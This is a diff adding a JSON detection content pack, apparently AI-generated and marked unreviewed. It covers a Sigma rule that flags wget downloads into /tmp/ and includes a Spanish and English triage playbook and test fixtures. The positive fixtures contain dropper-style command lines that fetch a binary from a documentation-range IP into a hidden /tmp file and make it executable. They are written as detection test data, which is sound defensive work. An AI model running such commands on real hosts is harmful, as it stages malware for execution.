@@ -1,0 +1,133 @@
+{
+  "rule": {
+    "id": "cf610c15-ed71-46e1-bdf8-2bd1a99de6c4",
+    "title": "Download File To Potentially Suspicious Directory Via Wget",
+    "level": "medium",
+    "status": "test",
+    "author": "Joseliyo Sanchez, @Joseliyo_Jstnk",
+    "path": "linux/process_creation/proc_creation_lnx_wget_download_suspicious_directory.yml",
+    "url": "https://github.com/SigmaHQ/sigma/blob/05d1031f537e830b76da53bae2400c5814c89165/rules/linux/process_creation/proc_creation_lnx_wget_download_suspicious_directory.yml",
+    "license": "DRL-1.1",
+    "techniques": [
+      "T1105"
+    ]
+  },
+  "playbook": {
+    "es": {
+      "summary": "Se ejecutó wget con -O o --output-document para guardar un archivo descargado en una ruta que contiene /tmp/. Los droppers en Linux suelen usar este patrón para preparar un payload antes de ejecutarlo.",
+      "what_it_detects": "Detecta procesos cuyo Image termina en /wget y cuyo CommandLine incluye la opción -O en mayúscula (validada con una expresión regular que distingue mayúsculas) o --output-document, junto con una ruta que contiene /tmp/, lo que también abarca /var/tmp/.",
+      "why_it_matters": "Corresponde a ATT&CK T1105 (Ingress Tool Transfer): el atacante trae herramientas o malware al host desde un servidor externo. /tmp es un directorio con permisos de escritura para todos y se usa con frecuencia para guardar binarios o scripts que se ejecutan después, como se documentó en campañas de malware contra dispositivos Linux.",
+      "triage_steps": [
+        "Revise el CommandLine completo: URL de origen, nombre del archivo de destino en /tmp/, nombres ocultos (con punto inicial) y opciones como -q o --no-check-certificate.",
+        "Evalúe el dominio o la IP de la URL: reputación, antigüedad, si es una IP directa o si usa HTTP sin cifrar o puertos poco comunes.",
+        "Analice ParentImage y la cadena de procesos: sh/bash lanzado por un servidor web, cron, un servicio o una sesión SSH interactiva.",
+        "Identifique el usuario que ejecutó el proceso y verifique si es una cuenta de servicio, root o un usuario que normalmente no usa wget.",
+        "Busque en el mismo host, en una ventana de +/- 15 minutos, chmod +x, ejecución del archivo descargado, borrado del archivo o conexiones salientes nuevas.",
+        "Si el archivo sigue en /tmp/, obtenga su hash, tipo (file) y tamaño, y compárelos con inteligencia de amenazas sin ejecutarlo.",
+        "Revise si hay alertas previas para el mismo host, usuario o URL, y si la misma URL aparece en otros endpoints."
+      ],
+      "false_positives": [
+        "Scripts de instalación o aprovisionamiento (cloud-init, Ansible, Dockerfiles) que descargan paquetes a /tmp/ antes de instalarlos.",
+        "Administradores que descargan herramientas o parches de forma manual a /tmp/ para pruebas.",
+        "Pipelines de CI/CD y tareas cron legítimas que usan /tmp/ como área de trabajo temporal."
+      ],
+      "response_steps": [
+        "Confirme con el responsable del host o del script si la descarga era esperada; si es legítima, documente la excepción con la URL y el proceso padre exactos.",
+        "Si es sospechosa, aísle el host de la red y conserve una copia del archivo descargado y de la memoria del proceso para análisis.",
+        "Bloquee el dominio o la IP de origen en el proxy, el firewall y el DNS, y busque el mismo indicador en otros equipos.",
+        "Elimine los artefactos maliciosos y la persistencia relacionada (cron, systemd, authorized_keys) solo después de validarlos, y rote las credenciales expuestas.",
+        "Corrija el vector de entrada (servicio vulnerable, credenciales débiles) y restaure el host desde una imagen confiable si hubo ejecución."
+      ],
+      "severity_rationale": "El nivel medio es adecuado porque descargar a /tmp/ es una técnica común de malware, pero también aparece en tareas administrativas legítimas, así que se necesita contexto para confirmarlo."
+    },
+    "en": {
+      "summary": "wget ran with -O or --output-document to save a download to a path containing /tmp/. Linux droppers often use this pattern to stage a payload before running it.",
+      "what_it_detects": "Processes whose Image ends with /wget and whose CommandLine has an uppercase -O option (checked by a case-sensitive regex) or --output-document, plus a path containing /tmp/. That also covers /var/tmp/.",
+      "why_it_matters": "This maps to ATT&CK T1105 (Ingress Tool Transfer), where an attacker pulls tools or malware onto the host from an external server. Any user can write to /tmp, so it is a common place to stage binaries or scripts before running them, as reported in malware campaigns against Linux devices.",
+      "triage_steps": [
+        "Read the full CommandLine: source URL, destination file in /tmp/, hidden (dot-prefixed) names and flags such as -q or --no-check-certificate.",
+        "Assess the URL's domain or IP: reputation, age, raw IP use, plain HTTP or unusual ports.",
+        "Check ParentImage and the process tree: sh/bash spawned by a web server, cron, a service or an interactive SSH session.",
+        "Identify the executing user and whether it is a service account, root or someone who doesn't normally use wget.",
+        "On the same host within +/- 15 minutes, look for chmod +x, execution of the downloaded file, file deletion or new outbound connections.",
+        "If the file still exists in /tmp/, collect its hash, file type and size and compare them with threat intelligence. Do not run it.",
+        "Look for earlier alerts on the same host, user or URL, and check whether the URL appears on other endpoints."
+      ],
+      "false_positives": [
+        "Install or provisioning scripts (cloud-init, Ansible, Dockerfiles) that download packages to /tmp/ before installing them.",
+        "Administrators manually downloading tools or patches to /tmp/ for testing.",
+        "CI/CD pipelines and legitimate cron jobs that use /tmp/ as scratch space."
+      ],
+      "response_steps": [
+        "Ask the host or script owner whether the download was expected. If it was legitimate, document an exception scoped to the exact URL and parent process.",
+        "If it looks suspicious, isolate the host and keep copies of the downloaded file and the process memory for analysis.",
+        "Block the source domain or IP at the proxy, firewall and DNS, and hunt for the same indicator on other hosts.",
+        "Remove confirmed malicious artifacts and persistence (cron, systemd, authorized_keys) only after verifying them, then rotate exposed credentials.",
+        "Fix the entry vector (vulnerable service, weak credentials). If the payload ran, rebuild the host from a trusted image."
+      ],
+      "severity_rationale": "Medium fits because malware often downloads to /tmp/, but admin work does it too, so the alert needs context before you can confirm it."
+    }
+  },
+  "fixtures": {
+    "positive": [
+      {
+        "description": "wget lanzado por un shell bajo el servidor web; descarga un binario a un archivo oculto en /tmp/ con -O",
+        "event": {
+          "Image": "/usr/bin/wget",
+          "CommandLine": "wget -q http://203.0.113.45/bins/x86 -O /tmp/.x86",
+          "ParentImage": "/bin/sh",
+          "ParentCommandLine": "sh -c cd /tmp; wget -q http://203.0.113.45/bins/x86 -O /tmp/.x86; chmod +x /tmp/.x86",
+          "User": "www-data",
+          "CurrentDirectory": "/tmp",
+          "ProcessId": 48213,
+          "Computer": "web-02"
+        }
+      },
+      {
+        "description": "wget usa --output-document para guardar un script en /var/tmp/",
+        "event": {
+          "Image": "/usr/bin/wget",
+          "CommandLine": "wget --no-check-certificate --output-document=/var/tmp/update.sh https://dl.example.org/update.sh",
+          "ParentImage": "/usr/bin/bash",
+          "User": "root",
+          "CurrentDirectory": "/root",
+          "ProcessId": 9921,
+          "Computer": "bastion-01"
+        }
+      }
+    ],
+    "negative": [
+      {
+        "description": "wget con -o en minúscula (archivo de log) a /tmp/; la regex que distingue mayúsculas no coincide y no hay --output-document",
+        "event": {
+          "Image": "/usr/bin/wget",
+          "CommandLine": "wget -o /tmp/wget.log https://downloads.example.com/pkg-1.2.tar.gz",
+          "ParentImage": "/usr/bin/bash",
+          "User": "jperez",
+          "CurrentDirectory": "/home/jperez",
+          "ProcessId": 30117,
+          "Computer": "dev-ws-07"
+        }
+      },
+      {
+        "description": "wget con -O pero el destino está en el directorio home, no en /tmp/",
+        "event": {
+          "Image": "/usr/bin/wget",
+          "CommandLine": "wget https://downloads.example.com/tool.tar.gz -O /home/jperez/tool.tar.gz",
+          "ParentImage": "/usr/bin/bash",
+          "User": "jperez",
+          "CurrentDirectory": "/home/jperez",
+          "ProcessId": 30244,
+          "Computer": "dev-ws-07"
+        }
+      }
+    ]
+  },
+  "generated": {
+    "tool": "content-pack/1",
+    "model": "claude-opus-5-5",
+    "at": "2026-10-26T02:55:11+00:00",
+    "review": "unreviewed",
+    "notice": "AI-generated content. Review it before relying on it. Fixtures are validated by Centinela's engine in session S7."
+  }
+}
